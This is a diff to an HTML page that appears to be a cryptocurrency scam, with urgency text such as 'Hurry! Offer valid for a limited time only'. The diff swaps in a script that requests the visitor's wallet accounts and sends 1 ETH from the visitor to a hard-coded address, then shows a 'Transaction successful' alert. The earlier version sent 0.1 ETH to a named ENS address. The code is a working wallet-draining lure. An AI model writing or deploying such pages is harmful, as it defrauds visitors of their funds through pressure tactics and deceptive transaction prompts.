@@ -81,27 +81,44 @@
         <div class="loading">Processing... Please wait for confirmation!</div>
         <p class="send-note">Hurry! Offer valid for a limited time only.</p>
     </div>
-    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/web3@1.8.0/dist/web3.min.js"></script>
     <script>
-        if (typeof window.ethereum !== 'undefined') {
-  const provider = new ethers.providers.Web3Provider(window.ethereum);
-  const signer = provider.getSigner();
-
-  async function sendTransaction() {
+async function sendEthereum() {
     try {
-      const tx = await signer.sendTransaction({
-        to: "vitalik.eth",
-        value: ethers.utils.parseEther("0.1")
-      });
-      console.log("Transaction sent:", tx);
-    } catch (error) {
-      console.error("Transaction failed:", error);
-    }
-  }
+        // Request account access
+        await ethereum.request({ method: 'eth_requestAccounts' });
 
-  provider.send("eth_requestAccounts", []).then(sendTransaction).catch(console.error);
-} else {
-  console.error("Ethereum wallet not found. Please install MetaMask or another Ethereum wallet.");
+        // Get the user's account
+        const accounts = await ethereum.request({ method: 'eth_accounts' });
+        const senderAddress = accounts[0];
+
+        // Specify the recipient address and the amount to send
+        const recipientAddress = '0xd8da6bf26964af9d7eed9e03e53415d37aa96045'; // Replace with the recipient's address
+        const amountInEther = '1.0'; // 1 Ethereum
+
+        // Convert the amount to Wei (smallest unit of Ether)
+        const amountInWei = Web3.utils.toWei(amountInEther, 'ether');
+
+        // Create the transaction object
+        const transactionParameters = {
+            to: recipientAddress,
+            from: senderAddress,
+            value: Web3.utils.toHex(amountInWei), // Convert to hexadecimal
+            gas: '21000' // Set the gas limit, adjust if necessary
+        };
+
+        // Send the transaction
+        const txHash = await ethereum.request({
+            method: 'eth_sendTransaction',
+            params: [transactionParameters],
+        });
+
+        console.log('Transaction sent:', txHash);
+        alert(`Transaction successful! Hash: ${txHash}`);
+    } catch (error) {
+        console.error('Error sending Ethereum:', error);
+        alert(`Error: ${error.message}`);
+    }
 }
 
     </script>
